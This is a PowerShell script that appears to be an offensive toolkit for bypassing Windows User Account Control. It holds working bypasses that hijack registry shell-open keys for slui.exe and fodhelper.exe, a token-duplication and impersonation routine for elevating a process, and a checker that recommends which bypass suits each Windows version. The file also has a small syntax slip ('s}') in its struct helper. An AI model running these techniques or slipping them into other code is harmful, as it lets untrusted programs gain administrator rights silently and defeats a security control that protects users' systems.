function Invoke-SluiBypass {
    [CmdletBinding()]
    param
    (
    [Parameter(Mandatory=$True,
    ValueFromPipeline=$True,
    ValueFromPipelineByPropertyName=$True,
    HelpMessage='Command to execute as HighIL.')]
    [string]$Command
    )
    $RegRoot = 'HKCU:\Software\Classes\exefile\shell\open'
    $Name = 'command'
    $OldValue = $null
    if(Test-Path $RegRoot) {
        $OldValue = Get-Item "$RegRoot\$Name" -ErrorAction SilentlyContinue
    }
    New-Item -Path $RegRoot -Name $Name -Value $Command -Force | Out-Null
    Start-Process 'C:\Windows\System32\slui.exe' -Verb RunAs
    Sleep 3
    Remove-Item -Path $RegRoot -Recurse
}
function Invoke-FodhelperBypass(){
    [CmdletBinding()]
    param
    (
    [Parameter(Mandatory=$True,
    ValueFromPipeline=$True,
    ValueFromPipelineByPropertyName=$True,
    HelpMessage='Command to execute as HighIL.')]
    [string]$Command
    )
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Command -Force
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}
function New-InMemoryModule {
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )
    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()
    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }
    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
    return $ModuleBuilder
}
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [String]
        $EntryPoint,
        [Switch]
        $SetLastError
    )
    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }
    New-Object PSObject -Property $Properties
}
function Add-Win32Type
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $TypeHash = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $i = 1
            ForEach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $Null)
                }
                $i++
            }
            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))
            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }
        $ReturnTypes = @{}
        ForEach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()
            $ReturnTypes[$Key] = $Type
        }
        return $ReturnTypes
    }
}
function psenum
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    $EnumType = $Type -as [Type]
    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)
    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }
    ForEach ($Key in $EnumElements.Keys)
    {
        $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }
    $EnumBuilder.CreateType()
}
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}
function struct
{
    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,
        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,
        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $ExplicitLayout,
        [System.Runtime.InteropServices.CharSet]
        $CharSet = [System.Runtime.InteropServices.CharSet]::Ansi
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    [Reflection.TypeAttributes] $StructAttributes = 'Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    switch($CharSet)
    {
        Ansi
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AnsiClass
        }
        Auto
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AutoClass
        }
        Unicode
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::UnicodeClass
        s}
    }
    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $Fields = New-Object Hashtable[]($StructFields.Count)
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }
    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']
        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']
        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')
        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            $NewField.SetCustomAttribute($AttribBuilder)
        }
        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
    $StructBuilder.CreateType()
}
$Module = New-InMemoryModule -ModuleName Win32
$SE_GROUP = psenum $Module SE_GROUP UInt32 @{
    DISABLED           = 0x00000000
    MANDATORY          = 0x00000001
    ENABLED_BY_DEFAULT = 0x00000002
    ENABLED            = 0x00000004
    OWNER              = 0x00000008
    USE_FOR_DENY_ONLY  = 0x00000010
    INTEGRITY          = 0x00000020
    INTEGRITY_ENABLED  = 0x00000040
    RESOURCE           = 0x20000000
    LOGON_ID           = 3221225472
} -Bitfield
$SECURITY_ATTRIBUTES = struct $Module SECURITY_ATTRIBUTES @{
    nLength = field 0 Int
    lpSecurityDescriptor = field 1 IntPtr
    bInheritHandle = field 2 Int
}
$SID_IDENTIFIER_AUTHORITY = struct $Module SID_IDENTIFIER_AUTHORITY @{
    value = field 0 byte[] -MarshalAs @('ByValArray',6)
}
$SID_AND_ATTRIBUTES = struct $Module SID_AND_ATTRIBUTES @{
    Sid = field 0 IntPtr
    Attributes = field 1 $SE_GROUP
}
$TOKEN_MANDATORY_LABEL = struct $Module TOKEN_MANDATORY_LABEL @{
    Label = field 0 $SID_AND_ATTRIBUTES
}
$STARTUPINFO = struct $Module STARTUPINFO @{
    cb = field 0 int
    lpReserved = field 1 string
    lpDesktop = field 2 string
    lpTitle = field 3 string
    dwX = field 4 int
    dwY = field 5 int
    dwXSize = field 6 int
    dwYSize = field 7 int
    dwXCountChars = field 8 int
    dwYCountChars = field 9 int
    dwFillAttribute = field 10 int
    dwFlags = field 11 int
    wShowWindow = field 12 int
    cbReserved2 = field 13 int
    lpReserved2 = field 14 IntPtr
    hStdInput = field 15 IntPtr
    hStdOutput = field 16 IntPtr
    hStdError = field 17 IntPtr
}
$PROCESS_INFORMATION = struct $Module PROCESS_INFORMATION @{
     hProcess = field 0 IntPtr
     hThread = field 1 IntPtr
     dwProcessId = field 2 int
     dwThreadId = field 3 int
}
$FunctionDefinitions = @(
    (func advapi32 OpenProcessToken ([bool]) @(
        [IntPtr],
        [UInt32],
        [IntPtr].MakeByRefType()
    ) -EntryPoint OpenProcessToken -SetLastError),
    (func advapi32 GetTokenInformation ([bool]) @(
        [IntPtr],
        [Int32],
        [IntPtr],
        [UInt32],
        [UInt32].MakeByRefType()
    ) -EntryPoint GetTokenInformation -SetLastError),
    (func advapi32 GetSidSubAuthorityCount ([IntPtr]) @(
        [IntPtr]
    ) -EntryPoint GetSidSubAuthorityCount -SetLastError),
    (func advapi32 GetSidSubAuthority([IntPtr]) @(
        [IntPtr],
        [UInt32]
    ) -EntryPoint GetSidSubAuthority -SetLastError),
    (func advapi32 DuplicateTokenEx ([bool]) @(
        [IntPtr],
        [UInt32],
        [IntPtr],
        [UInt32],
        [UInt32],
        [IntPtr].MakeByRefType()
    ) -EntryPoint DuplicateTokenEx -SetLastError),
    (func advapi32 AllocateAndInitializeSid ([bool]) @(
        $SID_IDENTIFIER_AUTHORITY,
        [Byte],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [UInt32],
        [IntPtr].MakeByRefType()                  
    ) -EntryPoint AllocateAndInitializeSid -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([bool]) @(
        [IntPtr]
    )-EntryPoint ImpersonateLoggedOnUser -SetLastError),
    (func advapi32 CreateProcessWithLogonW ([bool]) @(
        [String],
        [String],
        [String],
        [UInt32],
        [String],
        [String],
        [UInt32],
        [UInt32],
        [String],
        [IntPtr],
        [IntPtr].MakeByRefType()
    )-EntryPoint CreateProcessWithLogonW -SetLastError),
    (func kernel32 OpenProcess ([IntPtr]) @(
        [UInt32],
        [bool],
        [UInt32]
    )-EntryPoint OpenProcess -SetLastError),
    (func kernel32 TerminateProcess ([bool]) @(
        [IntPtr],
        [UInt32]
    )-EntryPoint TerminateProcess -SetLastError),
    (func ntdll NtSetInformationToken ([int]) @(
        [IntPtr],
        [UInt32],
        [IntPtr],
        [UInt32]
    )-EntryPoint NtSetInformationToken -SetLastError),
    (func ntdll NtFilterToken ([int]) @(
        [IntPtr],
        [UInt32],
        [IntPtr],
        [IntPtr],
        [IntPtr],
        [IntPtr].MakeByRefType()
    )-EntryPoint NtFilterToken -SetLastError)
)
$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'Win32'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
$ntdll = $Types['ntdll']
function EnumProcesses(){
	Get-Process | ? { $_.Name -ne 'ctfmon' } | %{
		$ProcHandle = $Kernel32::OpenProcess(0x00001000, $false, $_.Id)
		if($ProcHandle -eq 0){
			return
		}
		$hTokenHandle = 0
		$CallResult = $Advapi32::OpenProcessToken($ProcHandle, 0x02000000, [ref]$hTokenHandle)
		if($CallResult -eq 0){
			return
		}	
		[int]$Length = 0
		$CallResult = $Advapi32::GetTokenInformation($hTokenHandle, 25, [IntPtr]::Zero, $Length, [ref]$Length)
		[IntPtr]$TokenInformation = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Length)
		$CallResult = $Advapi32::GetTokenInformation($hTokenHandle, 25, $TokenInformation, $Length, [ref]$Length)
		[System.IntPtr] $pSid1 = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($TokenInformation)
		[int]$IntegrityLevel = [System.Runtime.InteropServices.Marshal]::ReadInt32($advapi32::GetSidSubAuthority($pSid1, ([System.Runtime.InteropServices.Marshal]::ReadByte($Advapi32::GetSidSubAuthorityCount($pSid1)) - 1)))
		if($IntegrityLevel -eq 12288){
			return [int]$_.Id
		}
	}
}
function ElevateProcess($HIProc,$Binary, $Arguments){
    $PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000
    $bInheritHandle = $false
	$hProcess = $Kernel32::OpenProcess($PROCESS_QUERY_LIMITED_INFORMATION, $bInheritHandle, $HIProc[0])	
	if ($hProcess -ne 0) {
			Write-Verbose "[*] Successfully acquired $((Get-Process -Id $HIProc).Name) handle"
		} else {
			Write-Verbose "[!] Failed to get process token!`n"
			Break
		}
	$hToken = [IntPtr]::Zero
	if($Advapi32::OpenProcessToken($hProcess, 0x02000000, [ref]$hToken)) {
		Write-Verbose "[*] Opened process token"
	} else {
		Write-Verbose "[!] Failed open process token!`n"
		Break
	}
	$hNewToken = [IntPtr]::Zero	
	$SEC_ATTRIBUTES_Struct = [Activator]::CreateInstance($SECURITY_ATTRIBUTES)
    [IntPtr]$SEC_ATTRIBUTES_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SECURITY_ATTRIBUTES::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($SEC_ATTRIBUTES_Struct, $SEC_ATTRIBUTES_PTR,$False)
	if($Advapi32::DuplicateTokenEx($hToken,0xf01ff,$SEC_ATTRIBUTES_PTR,2,1,[ref]$hNewToken)) {
		Write-Verbose "[*] Duplicated process token"
	} else {
		Write-Verbose "[!] Failed to duplicate process token!`n"
		Break
	}
	$SIA_Struct = [Activator]::CreateInstance($SID_IDENTIFIER_AUTHORITY)
    $SIA_Struct.Value = [byte[]](0x0, 0x0, 0x0, 0x0, 0x0, 0x10)
    [IntPtr]$SIA_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SID_IDENTIFIER_AUTHORITY::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($SIA_Struct,$SIA_PTR,$False)
	$pSid = [System.IntPtr]::Zero
	$Advapi32::AllocateAndInitializeSid($SIA_PTR,1,0x2000,0,0,0,0,0,0,0,[ref]$pSid)
	$SID_AND_ATTRIBUTES_Struct = [Activator]::CreateInstance($SID_AND_ATTRIBUTES)
    $SID_AND_ATTRIBUTES_Struct.Sid = $pSid
    $SID_AND_ATTRIBUTES_Struct.Attributes = 0x20
    [IntPtr]$SID_AND_ATTRIBUTES_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SID_AND_ATTRIBUTES::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($SID_AND_ATTRIBUTES_Struct, $SID_AND_ATTRIBUTES_PTR,$False)
	$TOKEN_MANDATORY_LABEL_Struct = [Activator]::CreateInstance($TOKEN_MANDATORY_LABEL)
    $TOKEN_MANDATORY_LABEL_Struct.Label = $SID_AND_ATTRIBUTES_Struct
    [IntPtr]$TOKEN_MANDATORY_LABEL_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TOKEN_MANDATORY_LABEL::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($TOKEN_MANDATORY_LABEL_Struct, $TOKEN_MANDATORY_LABEL_PTR,$False)
    $TOKEN_MANDATORY_LABEL_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($TOKEN_MANDATORY_LABEL_Struct)
	if($ntdll::NtSetInformationToken($hNewToken,25,$TOKEN_MANDATORY_LABEL_PTR,$($TOKEN_MANDATORY_LABEL_SIZE)) -eq 0) {
		Write-Verbose "[*] Lowered token mandatory IL"
	} else {
		Write-Verbose "[!] Failed modify token!`n"
		Break
	}
	[IntPtr]$LUAToken = [System.IntPtr]::Zero
	if($ntdll::NtFilterToken($hNewToken,4,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[ref]$LUAToken) -eq 0) {
		Write-Verbose "[*] Created restricted token"
	} else {
		Write-Verbose "[!] Failed to create restricted token!`n"
		Break
	}
	[IntPtr]$hNewToken = [System.IntPtr]::Zero
	$NEW_SECURITY_ATTRIBUTES_Struct = [Activator]::CreateInstance($SECURITY_ATTRIBUTES)
    [IntPtr]$NEW_SECURITY_ATTRIBUTES_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SECURITY_ATTRIBUTES::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($NEW_SECURITY_ATTRIBUTES_Struct, $NEW_SECURITY_ATTRIBUTES_PTR,$False)
	if($Advapi32::DuplicateTokenEx($LUAToken,0xc,$NEW_SECURITY_ATTRIBUTES_PTR,2,2,[ref]$hNewToken)){
		Write-Verbose "[*] Duplicated restricted token"
	} else {
		Write-Verbose "[!] Failed to duplicate restricted token!`n"
		Break
	}
	if($Advapi32::ImpersonateLoggedOnUser($hNewToken)){
		Write-Verbose "[*] Successfully impersonated security context"
	} else {
		Write-Verbose "[!] Failed impersonate context!`n"
		Break
	}
	$STARTUP_INFO_STRUCT = [Activator]::CreateInstance($STARTUPINFO)
    $STARTUP_INFO_STRUCT.dwFlags = 0x00000001 
    $STARTUP_INFO_STRUCT.wShowWindow = 0x0001
    $STARTUP_INFO_STRUCT.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($STARTUP_INFO_STRUCT)
    [IntPtr]$STARTUP_INFO_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($STARTUPINFO::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($STARTUP_INFO_STRUCT,$STARTUP_INFO_PTR,$false)
	$PROCESS_INFORMATION_STRUCT = [Activator]::CreateInstance($PROCESS_INFORMATION)
    [IntPtr]$PROCESS_INFORMATION_PTR = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PROCESS_INFORMATION::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($PROCESS_INFORMATION_STRUCT,$PROCESS_INFORMATION_PTR,$false)
	$path = $Env:SystemRoot
	$advapi32::CreateProcessWithLogonW("l","o","l",0x00000002,$Binary,$Binary + " " + $Arguments,0x04000000,$null,$path,$STARTUP_INFO_PTR,[ref]$PROCESS_INFORMATION_PTR)
}
function Invoke-TokenDuplication {
    param(
		[Parameter(Mandatory = $True)]
		[String]$Binary,
		[Parameter(Mandatory = $False)]
		[String]$Arguments,
		[Parameter(Mandatory = $False)]
		[int]$ProcID
	)
    if(!$ProcID){
        $VerbosePreference = "continue"
        Write-Verbose "Enumerating Process list..."
        $HIProc = @(EnumProcesses)
        if($HIProc.count -eq 0){
            Write-Verbose "No HI process available, starting one..."
            $StartInfo = New-Object Diagnostics.ProcessStartInfo
            $StartInfo.FileName = "TaskMgr.exe"
            $StartInfo.UseShellExecute = $true
            $StartInfo.Verb = "runas"
            $Startinfo.WindowStyle = 'Hidden'
            $Startinfo.CreateNoWindow = $True
            $Process = New-Object Diagnostics.Process
            $Process.StartInfo = $StartInfo
            $null = $Process.Start()
            Write-Verbose "Enumerating Process list again..."
            $HIProc = EnumProcesses
            Write-Verbose "HI Process found. PID: $HIProc"
            Write-Verbose "DuplicatingToken from $HIProc"
            Write-Verbose $Binary
            $null = ElevateProcess $HIProc $Binary $Arguments
            Write-Verbose "Sleeping 5 seconds..."
            Start-sleep 5
            Write-Verbose "Killing the newly created process"
            $null = $Kernel32::TerminateProcess($Process.Handle,1)
        }else{
            Write-Verbose "HI Proc found. ID: $HIProc"
            ElevateProcess $HIProc $Binary $Arguments
        }
    }else{
        Write-Verbose "Elevating $ProcID"
        ElevateProcess $ProcID $Binary $Arguments
    }
}
function Get-AlwaysNotifySetting {
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1) {
        return $true
    } else {
        return $false
    }
}
function Test-IsAdmin {
    $IsAdmin = whoami /groups /fo csv | ConvertFrom-CSV | Where-Object { $_.SID -eq 'S-1-5-32-544' }
    if ($IsAdmin -eq $null) {
        Write-Host "[-] $env:USERNAME is not a local Administrator."
        return $false
    } else {
        Write-Host "[+] $env:USERNAME is a local Administrator!"
        return $true
    }
}
function Write-UACOptions {
    param(
		[Parameter(Mandatory = $True)]
		[String[]]$Option
	)
    $Notify = Get-AlwaysNotifySetting
    $AlwaysNotifyBypassMethods = @('Invoke-TokenDuplication')
    if ($Notify) {
        Write-Output '[!] Warning: AlwaysNotify UAC setting detected.'
    }
    $Option | % {
        if ($Notify -eq $false) {
            Write-Output "[+] $_ should work to bypass UAC."
        } elseif ($Notify -and $AlwaysNotifyBypassMethods.Contains($_)) {
            Write-Output "[+] $_ should work to bypass UAC."
        }
    }
    Write-Output ""
}
function Test-UAC {
    $IsAdmin = Test-IsAdmin
    if ($IsAdmin -eq $false) {
        return $null
    }
    $Version = (Get-WmiObject Win32_OperatingSystem -Property Version).Version
    Write-Output "[Info] $env:COMPUTERNAME is Windows $Version."
    Write-Output ""
    $UACTable = @{
        "7"=@('Invoke-TokenDuplication');
        "10"=@('Invoke-SluiBypass','Invoke-FodhelperBypass', 'Invoke-TokenDuplication');
        "2008"=@('Invoke-TokenDuplication');
        "2012"=@('Invoke-SluiBypass');
        "2016"=@('Invoke-TokenDuplication','Invoke-SluiBypass','Invoke-FodhelperBypass')
    }
    if ($Version.StartsWith('6.1')) {
        Write-UACOptions -Option $UACTable['7']
    } elseif ($Version.StartsWith('10.0')) {
        Write-UACOptions -Option $UACTable['10']
    } elseif ($Version.StartsWith('6.3')) {
        Write-UACOptions -Option $UACTable['2012']
    } else {
        Write-Output '[-] No compatible operating system found.'
    }
}